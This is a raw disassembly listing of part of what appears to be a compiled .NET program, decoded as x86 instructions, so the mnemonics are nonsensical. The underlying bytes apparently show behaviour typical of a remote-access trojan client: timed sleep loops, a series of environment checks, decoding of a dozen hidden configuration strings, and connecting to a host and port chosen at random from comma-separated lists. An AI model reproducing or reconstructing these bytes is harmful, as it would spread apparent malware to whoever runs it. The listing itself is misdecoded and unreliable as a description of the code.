  4025e8:	39 0c 00             	cmp    %ecx,(%eax,%eax,1)
  4025eb:	00 00                	add    %al,(%eax)
  4025ed:	02 20                	add    (%eax),%ah
  4025ef:	c3                   	ret
  4025f0:	00 00                	add    %al,(%eax)
  4025f2:	00 6f ee             	add    %ch,-0x12(%edi)
  4025f5:	00 00                	add    %al,(%eax)
  4025f7:	0a 2a                	or     (%edx),%ch
  4025f9:	02 20                	add    (%eax),%ah
  4025fb:	c2 00 00             	ret    $0x0
  4025fe:	00 6f ee             	add    %ch,-0x12(%edi)
  402601:	00 00                	add    %al,(%eax)
  402603:	0a 2a                	or     (%edx),%ch
  402605:	00 00                	add    %al,(%eax)
  402607:	00 1b                	add    %bl,(%ebx)
  402609:	30 02                	xor    %al,(%edx)
  40260b:	00 c5                	add    %al,%ch
  40260d:	00 00                	add    %al,(%eax)
  40260f:	00 01                	add    %al,(%ecx)
  402611:	00 00                	add    %al,(%eax)
  402613:	11 16                	adc    %edx,(%esi)
  402615:	0a 38                	or     (%eax),%bh
  402617:	0e                   	push   %cs
  402618:	00 00                	add    %al,(%eax)
  40261a:	00 20                	add    %ah,(%eax)
  40261c:	e8 03 00 00 28       	call   0x28402624
  402621:	14 00                	adc    $0x0,%al
  402623:	00 0a                	add    %cl,(%edx)
  402625:	06                   	push   %es
  402626:	17                   	pop    %ss
  402627:	58                   	pop    %eax
  402628:	0a 06                	or     (%esi),%al
  40262a:	7e 11                	jle    0x40263d
  40262c:	00 00                	add    %al,(%eax)
  40262e:	04 28                	add    $0x28,%al
  402630:	15 00 00 0a 32       	adc    $0x320a0000,%eax
  402635:	e5 28                	in     $0x28,%eax
  402637:	03 00                	add    (%eax),%eax
  402639:	00 06                	add    %al,(%esi)
  40263b:	3a 06                	cmp    (%esi),%al
  40263d:	00 00                	add    %al,(%eax)
  40263f:	00 16                	add    %dl,(%esi)
  402641:	28 16                	sub    %dl,(%esi)
  402643:	00 00                	add    %al,(%eax)
  402645:	0a 00                	or     (%eax),%al
  402647:	28 36                	sub    %dh,(%esi)
  402649:	00 00                	add    %al,(%eax)
  40264b:	06                   	push   %es
  40264c:	3a 06                	cmp    (%esi),%al
  40264e:	00 00                	add    %al,(%eax)
  402650:	00 16                	add    %dl,(%esi)
  402652:	28 16                	sub    %dl,(%esi)
  402654:	00 00                	add    %al,(%eax)
  402656:	0a 7e 0c             	or     0xc(%esi),%bh
  402659:	00 00                	add    %al,(%eax)
  40265b:	04 28                	add    $0x28,%al
  40265d:	17                   	pop    %ss
  40265e:	00 00                	add    %al,(%eax)
  402660:	0a 39                	or     (%ecx),%bh
  402662:	05 00 00 00 28       	add    $0x28000000,%eax
  402667:	26 00 00             	add    %al,%es:(%eax)
  40266a:	06                   	push   %es
  40266b:	7e 04                	jle    0x402671
  40266d:	00 00                	add    %al,(%eax)
  40266f:	04 28                	add    $0x28,%al
  402671:	17                   	pop    %ss
  402672:	00 00                	add    %al,(%eax)
  402674:	0a 39                	or     (%ecx),%bh
  402676:	05 00 00 00 28       	add    $0x28000000,%eax
  40267b:	24 00                	and    $0x0,%al
  40267d:	00 06                	add    %al,(%esi)
  40267f:	7e 0f                	jle    0x402690
  402681:	00 00                	add    %al,(%eax)
  402683:	04 28                	add    $0x28,%al
  402685:	17                   	pop    %ss
  402686:	00 00                	add    %al,(%eax)
  402688:	0a 39                	or     (%ecx),%bh
  40268a:	0f 00 00             	sldt   (%eax)
  40268d:	00 28                	add    %ch,(%eax)
  40268f:	30 00                	xor    %al,(%eax)
  402691:	00 06                	add    %al,(%esi)
  402693:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  402699:	3f                   	aas
  40269a:	00 00                	add    %al,(%eax)
  40269c:	06                   	push   %es
  40269d:	28 34 00             	sub    %dh,(%eax,%eax,1)
  4026a0:	00 06                	add    %al,(%esi)
  4026a2:	dd 06                	fldl   (%esi)
  4026a4:	00 00                	add    %al,(%eax)
  4026a6:	00 26                	add    %ah,(%esi)
  4026a8:	dd 00                	fldl   (%eax)
  4026aa:	00 00                	add    %al,(%eax)
  4026ac:	00 00                	add    %al,(%eax)
  4026ae:	28 12                	sub    %dl,(%edx)
  4026b0:	00 00                	add    %al,(%eax)
  4026b2:	06                   	push   %es
  4026b3:	3a 0a                	cmp    (%edx),%cl
  4026b5:	00 00                	add    %al,(%eax)
  4026b7:	00 28                	add    %ch,(%eax)
  4026b9:	1e                   	push   %ds
  4026ba:	00 00                	add    %al,(%eax)
  4026bc:	06                   	push   %es
  4026bd:	28 1b                	sub    %bl,(%ebx)
  4026bf:	00 00                	add    %al,(%eax)
  4026c1:	06                   	push   %es
  4026c2:	dd 06                	fldl   (%esi)
  4026c4:	00 00                	add    %al,(%eax)
  4026c6:	00 26                	add    %ah,(%esi)
  4026c8:	dd 00                	fldl   (%eax)
  4026ca:	00 00                	add    %al,(%eax)
  4026cc:	00 20                	add    %ah,(%eax)
  4026ce:	88 13                	mov    %dl,(%ebx)
  4026d0:	00 00                	add    %al,(%eax)
  4026d2:	28 14 00             	sub    %dl,(%eax,%eax,1)
  4026d5:	00 0a                	add    %cl,(%edx)
  4026d7:	2b d4                	sub    %esp,%edx
  4026d9:	00 00                	add    %al,(%eax)
  4026db:	00 01                	add    %al,(%ecx)
  4026dd:	1c 00                	sbb    $0x0,%al
  4026df:	00 00                	add    %al,(%eax)
  4026e1:	00 33                	add    %dh,(%ebx)
  4026e3:	00 60 93             	add    %ah,-0x6d(%eax)
  4026e6:	00 06                	add    %al,(%esi)
  4026e8:	01 00                	add    %eax,(%eax)
  4026ea:	00 01                	add    %al,(%ecx)
  4026ec:	00 00                	add    %al,(%eax)
  4026ee:	9a 00 19 b3 00 06 01 	lcall  $0x106,$0xb31900
  4026f5:	00 00                	add    %al,(%eax)
  4026f7:	01 1b                	add    %ebx,(%ebx)
  4026f9:	30 02                	xor    %al,(%edx)
  4026fb:	00 2d 01 00 00 02    	add    %ch,0x2000001
  402701:	00 00                	add    %al,(%eax)
  402703:	11 28                	adc    %ebp,(%eax)
  402705:	19 00                	sbb    %eax,(%eax)
  402707:	00 0a                	add    %cl,(%edx)
  402709:	7e 07                	jle    0x402712
  40270b:	00 00                	add    %al,(%eax)
  40270d:	04 28                	add    $0x28,%al
  40270f:	1a 00                	sbb    (%eax),%al
  402711:	00 0a                	add    %cl,(%edx)
  402713:	6f                   	outsl  %ds:(%esi),(%dx)
  402714:	1b 00                	sbb    (%eax),%eax
  402716:	00 0a                	add    %cl,(%edx)
  402718:	80 07 00             	addb   $0x0,(%edi)
  40271b:	00 04 7e             	add    %al,(%esi,%edi,2)
  40271e:	07                   	pop    %es
  40271f:	00 00                	add    %al,(%eax)
  402721:	04 73                	add    $0x73,%al
  402723:	4b                   	dec    %ebx
  402724:	00 00                	add    %al,(%eax)
  402726:	06                   	push   %es
  402727:	80 0d 00 00 04 7e 0d 	orb    $0xd,0x7e040000
  40272e:	00 00                	add    %al,(%eax)
  402730:	04 7e                	add    $0x7e,%al
  402732:	01 00                	add    %eax,(%eax)
  402734:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402737:	4e                   	dec    %esi
  402738:	00 00                	add    %al,(%eax)
  40273a:	06                   	push   %es
  40273b:	80 01 00             	addb   $0x0,(%ecx)
  40273e:	00 04 7e             	add    %al,(%esi,%edi,2)
  402741:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402746:	02 00                	add    (%eax),%al
  402748:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40274b:	4e                   	dec    %esi
  40274c:	00 00                	add    %al,(%eax)
  40274e:	06                   	push   %es
  40274f:	80 02 00             	addb   $0x0,(%edx)
  402752:	00 04 7e             	add    %al,(%esi,%edi,2)
  402755:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  40275a:	03 00                	add    (%eax),%eax
  40275c:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40275f:	4e                   	dec    %esi
  402760:	00 00                	add    %al,(%eax)
  402762:	06                   	push   %es
  402763:	80 03 00             	addb   $0x0,(%ebx)
  402766:	00 04 7e             	add    %al,(%esi,%edi,2)
  402769:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  40276e:	04 00                	add    $0x0,%al
  402770:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402773:	4e                   	dec    %esi
  402774:	00 00                	add    %al,(%eax)
  402776:	06                   	push   %es
  402777:	80 04 00 00          	addb   $0x0,(%eax,%eax,1)
  40277b:	04 7e                	add    $0x7e,%al
  40277d:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402782:	08 00                	or     %al,(%eax)
  402784:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402787:	4e                   	dec    %esi
  402788:	00 00                	add    %al,(%eax)
  40278a:	06                   	push   %es
  40278b:	80 08 00             	orb    $0x0,(%eax)
  40278e:	00 04 7e             	add    %al,(%esi,%edi,2)
  402791:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402796:	0e                   	push   %cs
  402797:	00 00                	add    %al,(%eax)
  402799:	04 6f                	add    $0x6f,%al
  40279b:	4e                   	dec    %esi
  40279c:	00 00                	add    %al,(%eax)
  40279e:	06                   	push   %es
  40279f:	80 0e 00             	orb    $0x0,(%esi)
  4027a2:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027a5:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027aa:	0c 00                	or     $0x0,%al
  4027ac:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027af:	4e                   	dec    %esi
  4027b0:	00 00                	add    %al,(%eax)
  4027b2:	06                   	push   %es
  4027b3:	80 0c 00 00          	orb    $0x0,(%eax,%eax,1)
  4027b7:	04 7e                	add    $0x7e,%al
  4027b9:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027be:	0f 00 00             	sldt   (%eax)
  4027c1:	04 6f                	add    $0x6f,%al
  4027c3:	4e                   	dec    %esi
  4027c4:	00 00                	add    %al,(%eax)
  4027c6:	06                   	push   %es
  4027c7:	80 0f 00             	orb    $0x0,(%edi)
  4027ca:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027cd:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027d2:	12 00                	adc    (%eax),%al
  4027d4:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027d7:	4e                   	dec    %esi
  4027d8:	00 00                	add    %al,(%eax)
  4027da:	06                   	push   %es
  4027db:	80 12 00             	adcb   $0x0,(%edx)
  4027de:	00 04 28             	add    %al,(%eax,%ebp,1)
  4027e1:	2d 00 00 06 80       	sub    $0x80060000,%eax
  4027e6:	10 00                	adc    %al,(%eax)
  4027e8:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027eb:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027f0:	0a 00                	or     (%eax),%al
  4027f2:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027f5:	4e                   	dec    %esi
  4027f6:	00 00                	add    %al,(%eax)
  4027f8:	06                   	push   %es
  4027f9:	80 0a 00             	orb    $0x0,(%edx)
  4027fc:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027ff:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402804:	09 00                	or     %eax,(%eax)
  402806:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402809:	4e                   	dec    %esi
  40280a:	00 00                	add    %al,(%eax)
  40280c:	06                   	push   %es
  40280d:	28 1a                	sub    %bl,(%edx)
  40280f:	00 00                	add    %al,(%eax)
  402811:	0a 73 1c             	or     0x1c(%ebx),%dh
  402814:	00 00                	add    %al,(%eax)
  402816:	0a 80 0b 00 00 04    	or     0x400000b(%eax),%al
  40281c:	28 04 00             	sub    %al,(%eax,%eax,1)
  40281f:	00 06                	add    %al,(%esi)
  402821:	0a dd                	or     %ch,%bl
  402823:	08 00                	or     %al,(%eax)
  402825:	00 00                	add    %al,(%eax)
  402827:	26 16                	es push %ss
  402829:	0a dd                	or     %ch,%bl
  40282b:	00 00                	add    %al,(%eax)
  40282d:	00 00                	add    %al,(%eax)
  40282f:	06                   	push   %es
  402830:	2a 00                	sub    (%eax),%al
  402832:	00 00                	add    %al,(%eax)
  402834:	41                   	inc    %ecx
  402835:	1c 00                	sbb    $0x0,%al
	...
  40283f:	00 23                	add    %ah,(%ebx)
  402841:	01 00                	add    %eax,(%eax)
  402843:	00 23                	add    %ah,(%ebx)
  402845:	01 00                	add    %eax,(%eax)
  402847:	00 08                	add    %cl,(%eax)
  402849:	00 00                	add    %al,(%eax)
  40284b:	00 01                	add    %al,(%ecx)
  40284d:	00 00                	add    %al,(%eax)
  40284f:	01 1b                	add    %ebx,(%ebx)
  402851:	30 04 00             	xor    %al,(%eax,%eax,1)
  402854:	51                   	push   %ecx
  402855:	00 00                	add    %al,(%eax)
  402857:	00 02                	add    %al,(%edx)
  402859:	00 00                	add    %al,(%eax)
  40285b:	11 7e 0b             	adc    %edi,0xb(%esi)
  40285e:	00 00                	add    %al,(%eax)
  402860:	04 6f                	add    $0x6f,%al
  402862:	1d 00 00 0a 6f       	sbb    $0x6f0a0000,%eax
  402867:	1e                   	push   %ds
  402868:	00 00                	add    %al,(%eax)
  40286a:	0a 74 2f 00          	or     0x0(%edi,%ebp,1),%dh
  40286e:	00 01                	add    %al,(%ecx)
  402870:	28 19                	sub    %bl,(%ecx)
  402872:	00 00                	add    %al,(%eax)
  402874:	0a 7e 07             	or     0x7(%esi),%bh
  402877:	00 00                	add    %al,(%eax)
  402879:	04 6f                	add    $0x6f,%al
  40287b:	1f                   	pop    %ds
  40287c:	00 00                	add    %al,(%eax)
  40287e:	0a 28                	or     (%eax),%ch
  402880:	53                   	push   %ebx
  402881:	00 00                	add    %al,(%eax)
  402883:	06                   	push   %es
  402884:	72 01                	jb     0x402887
  402886:	00 00                	add    %al,(%eax)
  402888:	70 28                	jo     0x4028b2
  40288a:	20 00                	and    %al,(%eax)
  40288c:	00 0a                	add    %cl,(%edx)
  40288e:	7e 0a                	jle    0x40289a
  402890:	00 00                	add    %al,(%eax)
  402892:	04 28                	add    $0x28,%al
  402894:	1a 00                	sbb    (%eax),%al
  402896:	00 0a                	add    %cl,(%edx)
  402898:	6f                   	outsl  %ds:(%esi),(%dx)
  402899:	21 00                	and    %eax,(%eax)
  40289b:	00 0a                	add    %cl,(%edx)
  40289d:	0a dd                	or     %ch,%bl
  40289f:	08 00                	or     %al,(%eax)
  4028a1:	00 00                	add    %al,(%eax)
  4028a3:	26 16                	es push %ss
  4028a5:	0a dd                	or     %ch,%bl
  4028a7:	00 00                	add    %al,(%eax)
  4028a9:	00 00                	add    %al,(%eax)
  4028ab:	06                   	push   %es
  4028ac:	2a 00                	sub    (%eax),%al
  4028ae:	00 00                	add    %al,(%eax)
  4028b0:	01 10                	add    %edx,(%eax)
  4028b2:	00 00                	add    %al,(%eax)
  4028b4:	00 00                	add    %al,(%eax)
  4028b6:	00 00                	add    %al,(%eax)
  4028b8:	47                   	inc    %edi
  4028b9:	47                   	inc    %edi
  4028ba:	00 08                	add    %cl,(%eax)
  4028bc:	31 00                	xor    %eax,(%eax)
  4028be:	00 01                	add    %al,(%ecx)
  4028c0:	13 30                	adc    (%eax),%esi
  4028c2:	01 00                	add    %eax,(%eax)
  4028c4:	9d                   	popf
  4028c5:	00 00                	add    %al,(%eax)
  4028c7:	00 00                	add    %al,(%eax)
  4028c9:	00 00                	add    %al,(%eax)
  4028cb:	00 72 0f             	add    %dh,0xf(%edx)
  4028ce:	00 00                	add    %al,(%eax)
  4028d0:	70 80                	jo     0x402852
  4028d2:	01 00                	add    %eax,(%eax)
  4028d4:	00 04 72             	add    %al,(%edx,%esi,2)
  4028d7:	ea 00 00 70 80 02 00 	ljmp   $0x2,$0x80700000
  4028de:	00 04 72             	add    %al,(%edx,%esi,2)
  4028e1:	c5 01                	lds    (%ecx),%eax
  4028e3:	00 70 80             	add    %dh,-0x80(%eax)
  4028e6:	03 00                	add    (%eax),%eax
  4028e8:	00 04 72             	add    %al,(%edx,%esi,2)
  4028eb:	78 02                	js     0x4028ef
  4028ed:	00 70 80             	add    %dh,-0x80(%eax)
  4028f0:	04 00                	add    $0x0,%al
  4028f2:	00 04 72             	add    %al,(%edx,%esi,2)
  4028f5:	2b 03                	sub    (%ebx),%eax
  4028f7:	00 70 80             	add    %dh,-0x80(%eax)
  4028fa:	05 00 00 04 72       	add    $0x72040000,%eax
  4028ff:	3f                   	aas
  402900:	03 00                	add    (%eax),%eax
  402902:	70 80                	jo     0x402884
  402904:	06                   	push   %es
  402905:	00 00                	add    %al,(%eax)
  402907:	04 72                	add    $0x72,%al
  402909:	63 03                	arpl   %eax,(%ebx)
  40290b:	00 70 80             	add    %dh,-0x80(%eax)
  40290e:	07                   	pop    %es
  40290f:	00 00                	add    %al,(%eax)
  402911:	04 72                	add    $0x72,%al
  402913:	bd 03 00 70 80       	mov    $0x80700003,%ebp
  402918:	08 00                	or     %al,(%eax)
  40291a:	00 04 72             	add    %al,(%edx,%esi,2)
  40291d:	70 04                	jo     0x402923
  40291f:	00 70 80             	add    %dh,-0x80(%eax)
  402922:	09 00                	or     %eax,(%eax)
  402924:	00 04 72             	add    %al,(%edx,%esi,2)
  402927:	cb                   	lret
  402928:	16                   	push   %ss
  402929:	00 70 80             	add    %dh,-0x80(%eax)
  40292c:	0a 00                	or     (%eax),%al
  40292e:	00 04 72             	add    %al,(%edx,%esi,2)
  402931:	7e 1e                	jle    0x402951
  402933:	00 70 80             	add    %dh,-0x80(%eax)
  402936:	0c 00                	or     $0x0,%al
  402938:	00 04 72             	add    %al,(%edx,%esi,2)
  40293b:	31 1f                	xor    %ebx,(%edi)
  40293d:	00 70 80             	add    %dh,-0x80(%eax)
  402940:	0e                   	push   %cs
  402941:	00 00                	add    %al,(%eax)
  402943:	04 72                	add    $0x72,%al
  402945:	e4 1f                	in     $0x1f,%al
  402947:	00 70 80             	add    %dh,-0x80(%eax)
  40294a:	0f 00 00             	sldt   (%eax)
  40294d:	04 14                	add    $0x14,%al
  40294f:	80 10 00             	adcb   $0x0,(%eax)
  402952:	00 04 72             	add    %al,(%edx,%esi,2)
  402955:	97                   	xchg   %eax,%edi
  402956:	20 00                	and    %al,(%eax)
  402958:	70 80                	jo     0x4028da
  40295a:	11 00                	adc    %eax,(%eax)
  40295c:	00 04 72             	add    %al,(%edx,%esi,2)
  40295f:	9b                   	fwait
  402960:	20 00                	and    %al,(%eax)
  402962:	70 80                	jo     0x4028e4
  402964:	12 00                	adc    (%eax),%al
  402966:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402969:	00 00                	add    %al,(%eax)
  40296b:	00 1b                	add    %bl,(%ebx)
  40296d:	30 07                	xor    %al,(%edi)
  40296f:	00 f1                	add    %dh,%cl
  402971:	02 00                	add    (%eax),%al
  402973:	00 03                	add    %al,(%ebx)
  402975:	00 00                	add    %al,(%eax)
  402977:	11 18                	adc    %ebx,(%eax)
  402979:	17                   	pop    %ss
  40297a:	1c 73                	sbb    $0x73,%al
  40297c:	22 00                	and    (%eax),%al
  40297e:	00 0a                	add    %cl,(%edx)
  402980:	25 20 00 c8 00       	and    $0xc80020,%eax
  402985:	00 6f 23             	add    %ch,0x23(%edi)
  402988:	00 00                	add    %al,(%eax)
  40298a:	0a 25 20 00 c8 00    	or     0xc80020,%ah
  402990:	00 6f 24             	add    %ch,0x24(%edi)
  402993:	00 00                	add    %al,(%eax)
  402995:	0a 28                	or     (%eax),%ch
  402997:	07                   	pop    %es
  402998:	00 00                	add    %al,(%eax)
  40299a:	06                   	push   %es
  40299b:	7e 0e                	jle    0x4029ab
  40299d:	00 00                	add    %al,(%eax)
  40299f:	04 72                	add    $0x72,%al
  4029a1:	4e                   	dec    %esi
  4029a2:	21 00                	and    %eax,(%eax)
  4029a4:	70 28                	jo     0x4029ce
  4029a6:	25 00 00 0a 39       	and    $0x390a0000,%eax
  4029ab:	e3 00                	jecxz  0x4029ad
  4029ad:	00 00                	add    %al,(%eax)
  4029af:	7e 02                	jle    0x4029b3
  4029b1:	00 00                	add    %al,(%eax)
  4029b3:	04 17                	add    $0x17,%al
  4029b5:	8d 39                	lea    (%ecx),%edi
  4029b7:	00 00                	add    %al,(%eax)
  4029b9:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4029c0:	26 00 00             	add    %al,%es:(%eax)
  4029c3:	0a 73 27             	or     0x27(%ebx),%dh
  4029c6:	00 00                	add    %al,(%eax)
  4029c8:	0a 7e 02             	or     0x2(%esi),%bh
  4029cb:	00 00                	add    %al,(%eax)
  4029cd:	04 17                	add    $0x17,%al
  4029cf:	8d 39                	lea    (%ecx),%edi
  4029d1:	00 00                	add    %al,(%eax)
  4029d3:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4029da:	26 00 00             	add    %al,%es:(%eax)
  4029dd:	0a 8e 69 6f 28 00    	or     0x286f69(%esi),%cl
  4029e3:	00 0a                	add    %cl,(%edx)
  4029e5:	9a 0a 7e 01 00 00 04 	lcall  $0x400,$0x17e0a
  4029ec:	17                   	pop    %ss
  4029ed:	8d 39                	lea    (%ecx),%edi
  4029ef:	00 00                	add    %al,(%eax)
  4029f1:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4029f8:	26 00 00             	add    %al,%es:(%eax)
  4029fb:	0a 73 27             	or     0x27(%ebx),%dh
  4029fe:	00 00                	add    %al,(%eax)
  402a00:	0a 7e 01             	or     0x1(%esi),%bh
  402a03:	00 00                	add    %al,(%eax)
  402a05:	04 17                	add    $0x17,%al
  402a07:	8d 39                	lea    (%ecx),%edi
  402a09:	00 00                	add    %al,(%eax)
  402a0b:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  402a11:	6f                   	outsl  %ds:(%esi),(%dx)
  402a12:	26 00 00             	add    %al,%es:(%eax)
  402a15:	0a 8e 69 6f 28 00    	or     0x286f69(%esi),%cl
  402a1b:	00 0a                	add    %cl,(%edx)
  402a1d:	9a 28 15 00 00 0a 0b 	lcall  $0xb0a,$0x1528
  402a24:	06                   	push   %es
  402a25:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  402a28:	00 06                	add    %al,(%esi)
  402a2a:	39 52 00             	cmp    %edx,0x0(%edx)
  402a2d:	00 00                	add    %al,(%eax)
  402a2f:	06                   	push   %es
  402a30:	28 29                	sub    %ch,(%ecx)
  402a32:	00 00                	add    %al,(%eax)
  402a34:	0a 0c 16             	or     (%esi,%edx,1),%cl
  402a37:	0d 38 39 00 00       	or     $0x3938,%eax
  402a3c:	00 08                	add    %cl,(%eax)
  402a3e:	09 a3 32 00 00 01    	or     %esp,0x1000032(%ebx)
  402a44:	13 04 28             	adc    (%eax,%ebp,1),%eax
  402a47:	06                   	push   %es
  402a48:	00 00                	add    %al,(%eax)
  402a4a:	06                   	push   %es
  402a4b:	11 04 07             	adc    %eax,(%edi,%eax,1)
  402a4e:	6f                   	outsl  %ds:(%esi),(%dx)
  402a4f:	2a 00                	sub    (%eax),%al
  402a51:	00 0a                	add    %cl,(%edx)
  402a53:	28 06                	sub    %al,(%esi)
  402a55:	00 00                	add    %al,(%eax)
  402a57:	06                   	push   %es
  402a58:	6f                   	outsl  %ds:(%esi),(%dx)
  402a59:	2b 00                	sub    (%eax),%eax
  402a5b:	00 0a                	add    %cl,(%edx)
  402a5d:	39 05 00 00 00 dd    	cmp    %eax,0xdd000000
  402a63:	c3                   	ret
  402a64:	00 00                	add    %al,(%eax)
  402a66:	00 dd                	add    %bl,%ch
  402a68:	06                   	push   %es
  402a69:	00 00                	add    %al,(%eax)
  402a6b:	00 26                	add    %ah,(%esi)
  402a6d:	dd 00                	fldl   (%eax)
  402a6f:	00 00                	add    %al,(%eax)
  402a71:	00 09                	add    %cl,(%ecx)
  402a73:	17                   	pop    %ss
  402a74:	58                   	pop    %eax
  402a75:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  402a7a:	32 c1                	xor    %cl,%al
  402a7c:	38 a9 00 00 00 28    	cmp    %ch,0x28000000(%ecx)
  402a82:	06                   	push   %es
  402a83:	00 00                	add    %al,(%eax)
  402a85:	06                   	push   %es
  402a86:	06                   	push   %es
  402a87:	07                   	pop    %es
  402a88:	6f                   	outsl  %ds:(%esi),(%dx)
  402a89:	2c 00                	sub    $0x0,%al
  402a8b:	00 0a                	add    %cl,(%edx)
  402a8d:	38 98 00 00 00 73    	cmp    %bl,0x73000000(%eax)
  402a93:	2d 00 00 0a 13       	sub    $0x130a0000,%eax
  402a98:	05 72 58 21 00       	add    $0x215872,%eax
  402a9d:	70 72                	jo     0x402b11
  402a9f:	58                   	pop    %eax
  402aa0:	21 00                	and    %eax,(%eax)
  402aa2:	70 73                	jo     0x402b17
  402aa4:	2e 00 00             	add    %al,%cs:(%eax)
  402aa7:	0a 13                	or     (%ebx),%dl
  402aa9:	06                   	push   %es
  402aaa:	11 05 11 06 6f 2f    	adc    %eax,0x2f6f0611
  402ab0:	00 00                	add    %al,(%eax)
  402ab2:	0a 11                	or     (%ecx),%dl
  402ab4:	05 7e 0e 00 00       	add    $0xe7e,%eax
  402ab9:	04 6f                	add    $0x6f,%al
  402abb:	30 00                	xor    %al,(%eax)
  402abd:	00 0a                	add    %cl,(%edx)
  402abf:	17                   	pop    %ss
  402ac0:	8d 38                	lea    (%eax),%edi
  402ac2:	00 00                	add    %al,(%eax)
  402ac4:	01 25 16 72 5a 21    	add    %esp,0x215a7216
  402aca:	00 70 a2             	add    %dh,-0x5e(%eax)
  402acd:	16                   	push   %ss
  402ace:	6f                   	outsl  %ds:(%esi),(%dx)
  402acf:	31 00                	xor    %eax,(%eax)
  402ad1:	00 0a                	add    %cl,(%edx)
  402ad3:	13 07                	adc    (%edi),%eax
  402ad5:	11 07                	adc    %eax,(%edi)
  402ad7:	16                   	push   %ss
  402ad8:	a3 38 00 00 01       	mov    %eax,0x1000038
  402add:	80 02 00             	addb   $0x0,(%edx)
  402ae0:	00 04 11             	add    %al,(%ecx,%edx,1)
  402ae3:	07                   	pop    %es
  402ae4:	73 27                	jae    0x402b0d
  402ae6:	00 00                	add    %al,(%eax)
  402ae8:	0a 17                	or     (%edi),%dl
  402aea:	11 07                	adc    %eax,(%edi)
  402aec:	8e 69 6f             	mov    0x6f(%ecx),%gs
  402aef:	32 00                	xor    (%eax),%al
  402af1:	00 0a                	add    %cl,(%edx)
  402af3:	a3 38 00 00 01       	mov    %eax,0x1000038
  402af8:	80 01 00             	addb   $0x0,(%ecx)
  402afb:	00 04 28             	add    %al,(%eax,%ebp,1)
  402afe:	06                   	push   %es
  402aff:	00 00                	add    %al,(%eax)
  402b01:	06                   	push   %es
  402b02:	7e 02                	jle    0x402b06
  402b04:	00 00                	add    %al,(%eax)
  402b06:	04 7e                	add    $0x7e,%al
  402b08:	01 00                	add    %eax,(%eax)
  402b0a:	00 04 28             	add    %al,(%eax,%ebp,1)
  402b0d:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
  402b12:	2c 00                	sub    $0x0,%al
  402b14:	00 0a                	add    %cl,(%edx)
  402b16:	dd 0f                	fisttpll (%edi)
  402b18:	00 00                	add    %al,(%eax)
  402b1a:	00 11                	add    %dl,(%ecx)
  402b1c:	05 39 07 00 00       	add    $0x739,%eax
  402b21:	00 11                	add    %dl,(%ecx)
  402b23:	05 6f 33 00 00       	add    $0x336f,%eax
  402b28:	0a dc                	or     %ah,%bl
  402b2a:	28 06                	sub    %al,(%esi)
  402b2c:	00 00                	add    %al,(%eax)
  402b2e:	06                   	push   %es
  402b2f:	6f                   	outsl  %ds:(%esi),(%dx)
  402b30:	2b 00                	sub    (%eax),%eax
  402b32:	00 0a                	add    %cl,(%edx)
  402b34:	39 18                	cmp    %ebx,(%eax)
  402b36:	01 00                	add    %eax,(%eax)
  402b38:	00 17                	add    %dl,(%edi)
  402b3a:	28 13                	sub    %dl,(%ebx)
  402b3c:	00 00                	add    %al,(%eax)
  402b3e:	06                   	push   %es
  402b3f:	28 06                	sub    %al,(%esi)
  402b41:	00 00                	add    %al,(%eax)
  402b43:	06                   	push   %es
  402b44:	17                   	pop    %ss
  402b45:	73 34                	jae    0x402b7b
  402b47:	00 00                	add    %al,(%eax)
  402b49:	0a 16                	or     (%esi),%dl
  402b4b:	14 fe                	adc    $0xfe,%al
  402b4d:	06                   	push   %es
  402b4e:	1d 00 00 06 73       	sbb    $0x73060000,%eax
  402b53:	35 00 00 0a 73       	xor    $0x730a0000,%eax
  402b58:	36 00 00             	add    %al,%ss:(%eax)
  402b5b:	0a 28                	or     (%eax),%ch
  402b5d:	09 00                	or     %eax,(%eax)
  402b5f:	00 06                	add    %al,(%esi)
  402b61:	28 08                	sub    %cl,(%eax)
  402b63:	00 00                	add    %al,(%eax)
  402b65:	06                   	push   %es
  402b66:	28 06                	sub    %al,(%esi)
  402b68:	00 00                	add    %al,(%eax)
  402b6a:	06                   	push   %es
  402b6b:	6f                   	outsl  %ds:(%esi),(%dx)
  402b6c:	37                   	aaa
  402b6d:	00 00                	add    %al,(%eax)
  402b6f:	0a 6f 38             	or     0x38(%edi),%ch
  402b72:	00 00                	add    %al,(%eax)
  402b74:	0a 17                	or     (%edi),%dl
  402b76:	8d 39                	lea    (%ecx),%edi
  402b78:	00 00                	add    %al,(%eax)
  402b7a:	01 25 16 1f 3a 9d    	add    %esp,0x9d3a1f16
  402b80:	6f                   	outsl  %ds:(%esi),(%dx)
  402b81:	26 00 00             	add    %al,%es:(%eax)
  402b84:	0a 16                	or     (%esi),%dl
  402b86:	a3 38 00 00 01       	mov    %eax,0x1000038
